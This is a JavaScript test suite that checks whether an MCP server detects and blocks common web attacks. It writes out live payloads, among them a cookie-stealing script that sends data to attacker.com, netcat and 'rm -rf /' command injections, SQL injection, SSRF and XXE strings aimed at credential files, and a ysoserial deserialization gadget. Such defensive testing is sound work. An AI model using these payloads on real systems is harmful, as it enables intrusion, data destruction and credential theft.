/**
 * Advanced Security Testing - Vulnerability Detection
 * Comprehensive security tests for common vulnerabilities and attack vectors
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import { McpServer } from '../../src/server.js';
import '../utils/custom-matchers.js';
import crypto from 'crypto';

describe('Vulnerability Detection Tests', () => {
  let server;
  let vulnerabilityTestConfig;

  beforeAll(async () => {
    server = new McpServer({
      environment: 'test',
      security: {
        enableVulnerabilityDetection: true,
        enableThreatPrevention: true,
        logSecurityEvents: true
      }
    });
    
    await server.initialize();
    
    vulnerabilityTestConfig = {
      maliciousPayloads: {
        xss: [
          '<script>alert("XSS")</script>',
          'javascript:alert("XSS")',
          '<img src="x" onerror="alert(\'XSS\')">',
          '<svg onload="alert(\'XSS\')">',
          '"><script>alert("XSS")</script>',
          '\'><script>alert(String.fromCharCode(88,83,83))</script>'
        ],
        sqlInjection: [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "admin'--",
          "' UNION SELECT * FROM users --",
          "1; DELETE FROM products; --",
          "' OR 1=1#"
        ],
        commandInjection: [
          "; cat /etc/passwd",
          "&& rm -rf /",
          "| nc attacker.com 4444",
          "`whoami`",
          "$(cat /etc/shadow)",
          "; shutdown -h now"
        ],
        pathTraversal: [
          "../../../etc/passwd",
          "..\\..\\..\\windows\\system32\\config\\sam",
          "....//....//....//etc/passwd",
          "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
          "..%252f..%252f..%252fetc%252fpasswd"
        ]
      }
    };
  });

  afterAll(async () => {
    if (server) {
      await server.shutdown();
    }
  });

  beforeEach(async () => {
    await server.resetSecurityState();
  });

  describe('Cross-Site Scripting (XSS) Detection', () => {
    it('should detect and prevent reflected XSS attacks', async () => {
      for (const xssPayload of vulnerabilityTestConfig.maliciousPayloads.xss) {
        const xssTestResponse = await server.callTool('security_test_xss_protection', {
          input: xssPayload,
          context: 'user_input',
          field: 'comment'
        });

        expect(xssTestResponse).toBeValidMcpToolResponse();
        expect(xssTestResponse.data.threat_detected).toBe(true);
        expect(xssTestResponse.data.threat_type).toBe('xss');
        expect(xssTestResponse.data.sanitized_input).toBeSanitizedInput();
        expect(xssTestResponse.data.action_taken).toMatch(/blocked|sanitized/i);
      }
    });

    it('should detect stored XSS vulnerabilities', async () => {
      const storedXssPayload = '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>';
      
      const storedXssResponse = await server.callTool('manufacturing_create_note', {
        product_id: 'PROD-001',
        note: storedXssPayload,
        created_by: 'test_user'
      });

      expect(storedXssResponse).toBeValidMcpToolResponse();
      
      if (storedXssResponse.data.security_warning) {
        expect(storedXssResponse.data.threat_detected).toBe(true);
        expect(storedXssResponse.data.original_content).not.toBe(storedXssResponse.data.stored_content);
      }

      // Attempt to retrieve the note
      const retrievalResponse = await server.callTool('manufacturing_get_note', {
        note_id: storedXssResponse.data.note_id
      });

      expect(retrievalResponse.data.note).toBeSanitizedInput();
    });

    it('should handle DOM-based XSS prevention', async () => {
      const domXssPayloads = [
        'javascript:alert(document.domain)',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:alert("XSS")',
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>'
      ];

      for (const payload of domXssPayloads) {
        const domXssResponse = await server.callTool('security_validate_url', {
          url: payload,
          context: 'redirect'
        });

        expect(domXssResponse.data.safe).toBe(false);
        expect(domXssResponse.data.threat_type).toMatch(/xss|malicious_url/i);
      }
    });

    it('should implement Content Security Policy validation', async () => {
      const cspValidationResponse = await server.callTool('security_validate_csp', {
        content: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==">',
        allowed_sources: ['self', 'data:', 'https:']
      });

      expect(cspValidationResponse).toBeValidMcpToolResponse();
      expect(cspValidationResponse.data).toHaveProperty('csp_compliant');
      expect(cspValidationResponse.data).toHaveProperty('violations');
    });
  });

  describe('SQL Injection Detection', () => {
    it('should detect SQL injection attempts in queries', async () => {
      for (const sqlPayload of vulnerabilityTestConfig.maliciousPayloads.sqlInjection) {
        const sqlInjectionResponse = await server.callTool('security_test_sql_injection', {
          query_parameter: sqlPayload,
          context: 'product_search',
          parameter_name: 'search_term'
        });

        expect(sqlInjectionResponse).toBeValidMcpToolResponse();
        expect(sqlInjectionResponse.data.threat_detected).toBe(true);
        expect(sqlInjectionResponse.data.threat_type).toBe('sql_injection');
        expect(sqlInjectionResponse.data.action_taken).toBe('blocked');
      }
    });

    it('should validate parameterized query usage', async () => {
      // Test safe parameterized query
      const safeQueryResponse = await server.callTool('database_execute_query', {
        query: 'SELECT * FROM products WHERE name = ? AND category = ?',
        parameters: ['Test Product', 'Electronics'],
        validate_security: true
      });

      expect(safeQueryResponse.data.security_validated).toBe(true);
      expect(safeQueryResponse.data.query_type).toBe('parameterized');

      // Test unsafe dynamic query
      const unsafeQueryResponse = await server.callTool('database_execute_query', {
        query: `SELECT * FROM products WHERE name = '${vulnerabilityTestConfig.maliciousPayloads.sqlInjection[0]}'`,
        parameters: [],
        validate_security: true
      });

      expect(unsafeQueryResponse.data.security_violation).toBe(true);
      expect(unsafeQueryResponse.data.threat_type).toBe('sql_injection');
    });

    it('should detect blind SQL injection attempts', async () => {
      const blindSqlPayloads = [
        "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
        "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' WAITFOR DELAY '00:00:05'--"
      ];

      for (const payload of blindSqlPayloads) {
        const blindSqlResponse = await server.callTool('security_analyze_query_timing', {
          input: payload,
          context: 'search_filter'
        });

        expect(blindSqlResponse.data.suspicious_timing).toBe(true);
        expect(blindSqlResponse.data.threat_detected).toBe(true);
      }
    });

    it('should implement database query monitoring', async () => {
      // Execute multiple suspicious queries
      const suspiciousQueries = [
        "SELECT * FROM users WHERE id = '1' OR '1'='1'",
        "SELECT * FROM products; DROP TABLE inventory;--",
        "SELECT password FROM users WHERE username = 'admin'--"
      ];

      for (const query of suspiciousQueries) {
        await server.callTool('security_monitor_database_query', {
          query: query,
          user_id: 'test_user',
          source_ip: '192.168.1.100'
        });
      }

      // Check security monitoring results
      const monitoringReport = await server.callTool('security_get_database_monitoring_report', {
        time_range: 60000 // Last minute
      });

      expect(monitoringReport.data.suspicious_activities).toBeGreaterThan(0);
      expect(monitoringReport.data.threat_patterns).toContain('sql_injection');
    });
  });

  describe('Command Injection Detection', () => {
    it('should detect command injection in system calls', async () => {
      for (const cmdPayload of vulnerabilityTestConfig.maliciousPayloads.commandInjection) {
        const cmdInjectionResponse = await server.callTool('security_test_command_injection', {
          command_parameter: cmdPayload,
          context: 'file_processing',
          operation: 'backup'
        });

        expect(cmdInjectionResponse).toBeValidMcpToolResponse();
        expect(cmdInjectionResponse.data.threat_detected).toBe(true);
        expect(cmdInjectionResponse.data.threat_type).toBe('command_injection');
        expect(cmdInjectionResponse.data.dangerous_commands).toBeInstanceOf(Array);
      }
    });

    it('should validate system command execution', async () => {
      // Test safe command execution
      const safeCommandResponse = await server.callTool('system_execute_command', {
        command: 'backup_database',
        parameters: ['--type', 'incremental'],
        validate_security: true
      });

      expect(safeCommandResponse.data.security_validated).toBe(true);
      expect(safeCommandResponse.data.command_whitelisted).toBe(true);

      // Test dangerous command execution
      const dangerousCommandResponse = await server.callTool('system_execute_command', {
        command: 'rm -rf /',
        parameters: [],
        validate_security: true
      });

      expect(dangerousCommandResponse.data.security_violation).toBe(true);
      expect(dangerousCommandResponse.data.threat_type).toBe('dangerous_command');
    });

    it('should implement command sanitization', async () => {
      const sanitizationTests = [
        {
          input: 'filename.txt; cat /etc/passwd',
          expected_safe: 'filename.txt'
        },
        {
          input: 'report_$(date).pdf',
          expected_safe: 'report_.pdf'
        },
        {
          input: 'file`whoami`.txt',
          expected_safe: 'file.txt'
        }
      ];

      for (const test of sanitizationTests) {
        const sanitizationResponse = await server.callTool('security_sanitize_filename', {
          filename: test.input
        });

        expect(sanitizationResponse.data.sanitized_filename).toBe(test.expected_safe);
        expect(sanitizationResponse.data.threats_removed).toBeInstanceOf(Array);
        expect(sanitizationResponse.data.threats_removed.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Path Traversal Detection', () => {
    it('should detect path traversal attempts', async () => {
      for (const pathPayload of vulnerabilityTestConfig.maliciousPayloads.pathTraversal) {
        const pathTraversalResponse = await server.callTool('security_test_path_traversal', {
          file_path: pathPayload,
          context: 'file_download',
          base_directory: '/var/app/uploads'
        });

        expect(pathTraversalResponse).toBeValidMcpToolResponse();
        expect(pathTraversalResponse.data.threat_detected).toBe(true);
        expect(pathTraversalResponse.data.threat_type).toBe('path_traversal');
        expect(pathTraversalResponse.data.action_taken).toBe('blocked');
      }
    });

    it('should validate file access controls', async () => {
      const fileAccessTests = [
        {
          path: '/var/app/uploads/report.pdf',
          allowed: true
        },
        {
          path: '/var/app/uploads/../../../etc/passwd',
          allowed: false
        },
        {
          path: '/var/app/uploads/subdir/file.txt',
          allowed: true
        },
        {
          path: 'C:\\Windows\\System32\\config\\SAM',
          allowed: false
        }
      ];

      for (const test of fileAccessTests) {
        const accessResponse = await server.callTool('security_validate_file_access', {
          requested_path: test.path,
          base_directory: '/var/app/uploads',
          user_id: 'test_user'
        });

        expect(accessResponse.data.access_allowed).toBe(test.allowed);
        
        if (!test.allowed) {
          expect(accessResponse.data.security_violation).toBe(true);
        }
      }
    });

    it('should implement secure file operations', async () => {
      // Test secure file upload
      const secureUploadResponse = await server.callTool('security_secure_file_upload', {
        filename: 'legitimate_report.pdf',
        content_type: 'application/pdf',
        file_size: 1024000,
        validate_content: true
      });

      expect(secureUploadResponse.data.upload_allowed).toBe(true);
      expect(secureUploadResponse.data.security_checks_passed).toBe(true);

      // Test malicious file upload
      const maliciousUploadResponse = await server.callTool('security_secure_file_upload', {
        filename: '../../malware.exe',
        content_type: 'application/octet-stream',
        file_size: 512000,
        validate_content: true
      });

      expect(maliciousUploadResponse.data.upload_allowed).toBe(false);
      expect(maliciousUploadResponse.data.security_violations).toContain('path_traversal');
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Protection', () => {
    it('should generate and validate CSRF tokens', async () => {
      // Generate CSRF token
      const csrfTokenResponse = await server.callTool('security_generate_csrf_token', {
        user_id: 'test_user',
        session_id: 'test_session_001'
      });

      expect(csrfTokenResponse).toBeValidMcpToolResponse();
      expect(csrfTokenResponse.data.csrf_token).toBeSecureToken();

      const csrfToken = csrfTokenResponse.data.csrf_token;

      // Validate legitimate request with CSRF token
      const legitimateRequestResponse = await server.callTool('security_validate_csrf_request', {
        csrf_token: csrfToken,
        user_id: 'test_user',
        session_id: 'test_session_001',
        origin: 'https://sentia-dashboard.com'
      });

      expect(legitimateRequestResponse.data.csrf_valid).toBe(true);

      // Validate request without CSRF token
      const noCsrfResponse = await server.callTool('security_validate_csrf_request', {
        csrf_token: null,
        user_id: 'test_user',
        session_id: 'test_session_001',
        origin: 'https://sentia-dashboard.com'
      });

      expect(noCsrfResponse.data.csrf_valid).toBe(false);
      expect(noCsrfResponse.data.security_violation).toBe(true);
    });

    it('should detect CSRF attacks from malicious origins', async () => {
      const csrfToken = 'valid_csrf_token_123';
      const maliciousOrigins = [
        'https://evil-site.com',
        'http://192.168.1.100:8080',
        'https://sentia-dashboard.evil.com',
        null
      ];

      for (const origin of maliciousOrigins) {
        const csrfAttackResponse = await server.callTool('security_validate_csrf_request', {
          csrf_token: csrfToken,
          user_id: 'test_user',
          session_id: 'test_session_001',
          origin: origin
        });

        expect(csrfAttackResponse.data.csrf_valid).toBe(false);
        expect(csrfAttackResponse.data.threat_type).toBe('csrf_attack');
      }
    });

    it('should implement SameSite cookie protection', async () => {
      const cookieResponse = await server.callTool('security_set_secure_cookie', {
        name: 'session_token',
        value: 'secure_session_value',
        same_site: 'strict',
        secure: true,
        http_only: true
      });

      expect(cookieResponse.data.cookie_set).toBe(true);
      expect(cookieResponse.data.security_attributes).toContain('SameSite=Strict');
      expect(cookieResponse.data.security_attributes).toContain('Secure');
      expect(cookieResponse.data.security_attributes).toContain('HttpOnly');
    });
  });

  describe('Server-Side Request Forgery (SSRF) Protection', () => {
    it('should detect SSRF attempts in URL parameters', async () => {
      const ssrfUrls = [
        'http://localhost:3000/admin',
        'http://127.0.0.1:22',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'ftp://internal.server.com/config',
        'http://internal-api:8080/secrets'
      ];

      for (const url of ssrfUrls) {
        const ssrfResponse = await server.callTool('security_validate_external_url', {
          url: url,
          context: 'webhook_callback',
          allow_internal: false
        });

        expect(ssrfResponse.data.url_safe).toBe(false);
        expect(ssrfResponse.data.threat_type).toBe('ssrf');
        expect(ssrfResponse.data.blocked_reason).toMatch(/internal|private|localhost/i);
      }
    });

    it('should implement URL whitelist validation', async () => {
      const urlWhitelistResponse = await server.callTool('security_configure_url_whitelist', {
        allowed_domains: [
          'api.xero.com',
          'shopify.myshopify.com',
          'sellingpartnerapi-na.amazon.com'
        ],
        allowed_ip_ranges: ['203.0.113.0/24'] // Example public IP range
      });

      expect(urlWhitelistResponse.data.whitelist_configured).toBe(true);

      // Test allowed URL
      const allowedUrlResponse = await server.callTool('security_validate_external_url', {
        url: 'https://api.xero.com/api.xro/2.0/Invoices',
        context: 'api_integration'
      });

      expect(allowedUrlResponse.data.url_safe).toBe(true);

      // Test blocked URL
      const blockedUrlResponse = await server.callTool('security_validate_external_url', {
        url: 'https://malicious-site.com/steal-data',
        context: 'api_integration'
      });

      expect(blockedUrlResponse.data.url_safe).toBe(false);
      expect(blockedUrlResponse.data.blocked_reason).toBe('not_whitelisted');
    });

    it('should monitor outbound requests for anomalies', async () => {
      // Generate suspicious outbound request pattern
      const suspiciousRequests = [
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://localhost:6379/info',
        'http://127.0.0.1:5432/',
        'http://internal-db:3306/'
      ];

      for (const url of suspiciousRequests) {
        await server.callTool('security_log_outbound_request', {
          url: url,
          user_id: 'test_user',
          timestamp: new Date().toISOString()
        });
      }

      // Check for SSRF anomaly detection
      const anomalyResponse = await server.callTool('security_detect_ssrf_anomalies', {
        user_id: 'test_user',
        time_window: 60000
      });

      expect(anomalyResponse.data.anomalies_detected).toBe(true);
      expect(anomalyResponse.data.anomaly_types).toContain('internal_resource_access');
    });
  });

  describe('Insecure Deserialization Detection', () => {
    it('should detect malicious serialized objects', async () => {
      const maliciousSerializedData = [
        'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABqrK/rq+AAAAMwA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADAA',
        'aced00057372003a79736f73657269616c2e7061796c6f6164732e7574696c2e476164676574732453747562',
        'rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0ABV0aGlzSXNBVGVzdFN0cmluZyEhIXEAfgAB'
      ];

      for (const serializedData of maliciousSerializedData) {
        const deserializationResponse = await server.callTool('security_validate_deserialization', {
          serialized_data: serializedData,
          context: 'session_data',
          allow_unsafe_classes: false
        });

        expect(deserializationResponse.data.safe_to_deserialize).toBe(false);
        expect(deserializationResponse.data.threat_detected).toBe(true);
        expect(deserializationResponse.data.threat_type).toBe('malicious_deserialization');
      }
    });

    it('should implement safe deserialization practices', async () => {
      // Test safe serialization whitelist
      const safeSerializationResponse = await server.callTool('security_configure_serialization_whitelist', {
        allowed_classes: [
          'com.sentia.manufacturing.Product',
          'com.sentia.manufacturing.Order',
          'java.lang.String',
          'java.lang.Integer',
          'java.util.ArrayList'
        ]
      });

      expect(safeSerializationResponse.data.whitelist_configured).toBe(true);

      // Test deserialization with whitelisted class
      const safeDeserializationResponse = await server.callTool('security_safe_deserialize', {
        class_name: 'com.sentia.manufacturing.Product',
        serialized_data: 'safe_product_data_here',
        validate_integrity: true
      });

      expect(safeDeserializationResponse.data.deserialization_allowed).toBe(true);
      expect(safeDeserializationResponse.data.integrity_verified).toBe(true);
    });
  });

  describe('XML External Entity (XXE) Protection', () => {
    it('should detect XXE injection attempts', async () => {
      const xxePayloads = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><id>&xxe;</id></order>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><updateProfile><name>&file;</name></updateProfile>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><data></data>'
      ];

      for (const xxePayload of xxePayloads) {
        const xxeResponse = await server.callTool('security_validate_xml_input', {
          xml_data: xxePayload,
          context: 'product_import',
          disable_external_entities: true
        });

        expect(xxeResponse.data.xxe_detected).toBe(true);
        expect(xxeResponse.data.threat_type).toBe('xxe_injection');
        expect(xxeResponse.data.action_taken).toBe('blocked');
      }
    });

    it('should implement secure XML parsing', async () => {
      const safeXml = '<?xml version="1.0" encoding="UTF-8"?><products><product><id>123</id><name>Test Product</name></product></products>';

      const secureParsingResponse = await server.callTool('security_parse_xml_safely', {
        xml_data: safeXml,
        schema_validation: true,
        external_entities_disabled: true
      });

      expect(secureParsingResponse.data.parsing_successful).toBe(true);
      expect(secureParsingResponse.data.security_validated).toBe(true);
      expect(secureParsingResponse.data.parsed_data).toHaveProperty('products');
    });
  });

  describe('Security Header Validation', () => {
    it('should validate security headers in HTTP responses', async () => {
      const securityHeadersResponse = await server.callTool('security_validate_response_headers', {
        headers: {
          'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'",
          'X-Frame-Options': 'DENY',
          'X-Content-Type-Options': 'nosniff',
          'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
          'Referrer-Policy': 'strict-origin-when-cross-origin'
        }
      });

      expect(securityHeadersResponse.data.headers_validated).toBe(true);
      expect(securityHeadersResponse.data.security_score).toBeGreaterThan(80);

      // Test missing security headers
      const weakHeadersResponse = await server.callTool('security_validate_response_headers', {
        headers: {
          'Content-Type': 'application/json'
        }
      });

      expect(weakHeadersResponse.data.headers_validated).toBe(false);
      expect(weakHeadersResponse.data.missing_headers).toContain('Content-Security-Policy');
      expect(weakHeadersResponse.data.missing_headers).toContain('X-Frame-Options');
    });

    it('should detect insecure header configurations', async () => {
      const insecureHeaders = {
        'Content-Security-Policy': "default-src *; script-src * 'unsafe-eval' 'unsafe-inline'",
        'X-Frame-Options': 'ALLOWALL',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Credentials': 'true'
      };

      const insecureHeadersResponse = await server.callTool('security_analyze_header_security', {
        headers: insecureHeaders
      });

      expect(insecureHeadersResponse.data.security_issues).toBeInstanceOf(Array);
      expect(insecureHeadersResponse.data.security_issues.length).toBeGreaterThan(0);
      expect(insecureHeadersResponse.data.risk_level).toBe('high');
    });
  });

  describe('Vulnerability Scanning and Reporting', () => {
    it('should perform comprehensive vulnerability scans', async () => {
      const vulnerabilityScanResponse = await server.callTool('security_perform_vulnerability_scan', {
        scan_type: 'comprehensive',
        include_dependencies: true,
        include_configuration: true,
        include_code_analysis: true
      });

      expect(vulnerabilityScanResponse).toBeValidMcpToolResponse();
      expect(vulnerabilityScanResponse.data).toHaveProperty('vulnerabilities');
      expect(vulnerabilityScanResponse.data).toHaveProperty('risk_assessment');
      expect(vulnerabilityScanResponse.data).toHaveProperty('recommendations');
      expect(vulnerabilityScanResponse.data.vulnerabilities).toBeInstanceOf(Array);
    });

    it('should generate security compliance reports', async () => {
      const complianceReportResponse = await server.callTool('security_generate_compliance_report', {
        standards: ['OWASP_TOP_10', 'ISO_27001', 'SOC_2'],
        include_remediation: true
      });

      expect(complianceReportResponse.data.compliance_status).toBeDefined();
      expect(complianceReportResponse.data.standards_compliance).toBeInstanceOf(Object);
      expect(complianceReportResponse.data.remediation_plan).toBeInstanceOf(Array);
    });

    it('should track vulnerability remediation progress', async () => {
      // Create vulnerability findings
      await server.callTool('security_log_vulnerability', {
        vulnerability_id: 'CVE-2024-001',
        severity: 'high',
        component: 'xml_parser',
        description: 'XXE vulnerability in XML processing'
      });

      // Mark remediation in progress
      const remediationResponse = await server.callTool('security_update_vulnerability_status', {
        vulnerability_id: 'CVE-2024-001',
        status: 'remediation_in_progress',
        assigned_to: 'security_team',
        target_date: '2024-04-30'
      });

      expect(remediationResponse.data.status_updated).toBe(true);

      // Get remediation tracking report
      const trackingResponse = await server.callTool('security_get_remediation_tracking', {
        include_metrics: true
      });

      expect(trackingResponse.data.active_vulnerabilities).toBeGreaterThan(0);
      expect(trackingResponse.data.remediation_metrics).toBeDefined();
    });
  });
});